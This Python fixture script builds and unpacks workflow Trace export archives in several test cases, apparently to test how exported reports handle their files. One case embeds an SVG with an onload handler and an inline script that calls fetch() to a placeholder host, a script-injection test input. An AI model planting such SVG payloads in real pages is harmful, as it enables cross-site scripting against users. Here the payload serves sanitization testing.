"""Build and relocate a real workflow Trace package for file-origin tests."""

from __future__ import annotations

import json
import sys
import zipfile
from pathlib import Path

from workspace_service.workflow_trace.export import (
    TraceExportResource,
    build_trace_export,
)


target = Path(sys.argv[1]).resolve()
target.mkdir(parents=True, exist_ok=True)
inspection = {
    "run": {
        "run_id": "offline-run",
        "workflow_id": "portable-review",
        "revision": 4,
        "state": "succeeded",
    },
    "final_outputs": [
        {
            "result_id": "artifact:design",
            "name": "housing.step",
            "preview": "Recorded STEP deliverable",
            "artifact": {"artifact_id": "design"},
        }
    ],
    "steps": [
        {
            "sequence": 1,
            "attempt": 2,
            "label": "Generate housing",
            "state": "succeeded",
        }
    ],
    "run_inputs": [{"name": "requirements.pdf", "kind": "link"}],
}
resources = (
    TraceExportResource(
        subject_id="design",
        name="housing.step",
        media_type="model/step",
        data=b"ISO-10303-21;\nEND-ISO-10303-21;\n",
        digest=None,
    ),
)
input_case = sys.argv[2] if len(sys.argv) > 2 else "default"
if input_case == "short":
    inspection["run_inputs"] = [
        {"name": "prompt", "kind": "text", "value": "Create a housing for the sensor."}
    ]
elif input_case == "many":
    inspection["run_inputs"] = [
        {
            "name": "prompt",
            "kind": "text",
            "value": "Create a housing for the sensor.\n"
            + "Preserve the assembly clearance and inspect the cable exit. " * 30
            + "END OF REQUEST",
        },
        *[
            {
                "name": f"reference-{index}.pdf",
                "kind": "link",
                "value": f"inputs/reference-{index}.pdf",
            }
            for index in range(24)
        ],
        {"name": "concept.png", "kind": "link", "value": "inputs/concept.png"},
        {
            "name": "design_limits",
            "kind": "structured",
            "value": {"clearance_mm": 0.2, "load_N": 20},
        },
    ]
elif input_case == "empty":
    inspection["run_inputs"] = []
elif input_case == "svg":
    resources += (
        TraceExportResource(
            "projection", "support-preview.svg", "image/svg+xml",
            b'<svg xmlns="http://www.w3.org/2000/svg" width="256" height="256" onload="parent.svgExecuted=true">'
            b'<script>parent.svgExecuted=true;fetch("https://invalid.example/script")</script>'
            b'<image href="https://invalid.example/image.png" width="200" height="200"/>'
            b'<rect width="100" height="100" fill="red"/></svg>',
            None, report_asset=True,
        ),
    )
elif input_case == "iterations":
    inspection["steps"] = [
        {
            "node_id": "generate-housing",
            "label": "Generate housing",
            "attempt": 1,
            "state": "failed",
            "outputs": [{"artifact": {"artifact_id": "design"}}],
        },
        {
            "node_id": "generate-housing",
            "label": "Generate housing",
            "attempt": 2,
            "state": "succeeded",
            "outputs": [{"artifact": {"artifact_id": "revised-design"}}],
        },
    ]
    resources += (
        TraceExportResource(
            "revised-design",
            "housing-revised.step",
            "model/step",
            b"ISO-10303-21;\nEND-ISO-10303-21;\n",
            None,
        ),
    )
elif input_case == "thirty-activities":
    lanes = ["Requirements", "Design", "Analysis", "Manufacturing", "Approval"]
    inspection["run"]["workflow_id"] = "Synthetic 30-activity layout test"
    inspection["steps"] = [
        {"node_id": f"activity-{index}", "label": f"Engineering activity {index + 1}",
         "attempt": 1, "state": "succeeded", "qualified_tool_name": "Layout fixture tool",
         "outputs": [{"artifact": {"artifact_id": "design"}}] if index == 29 else []}
        for index in range(30)
    ]
    inspection["graph"] = {
        "nodes": [{"node_id": f"activity-{index}", "lane": lanes[index // 6]} for index in range(30)],
        "connections": [{"source_node_id": f"activity-{index}", "target_node_id": f"activity-{index + 1}", "label": f"Handoff {index + 1}"} for index in range(29)],
    }
urls = {}
for mode in ("report_only", "full_data"):
    archive = build_trace_export(
        inspection=inspection,
        evidence={"run_id": "offline-run", "artifacts": []},
        mode=mode,
        resources=resources,
    )
    zip_path = target / f"portable-review-{mode}.zip"
    zip_path.write_bytes(archive)
    extracted = target / "relocated" / mode / "review"
    with zipfile.ZipFile(zip_path) as bundle:
        bundle.extractall(extracted)
    urls[mode] = (extracted / "index.html").as_uri()
print(json.dumps(urls, sort_keys=True))
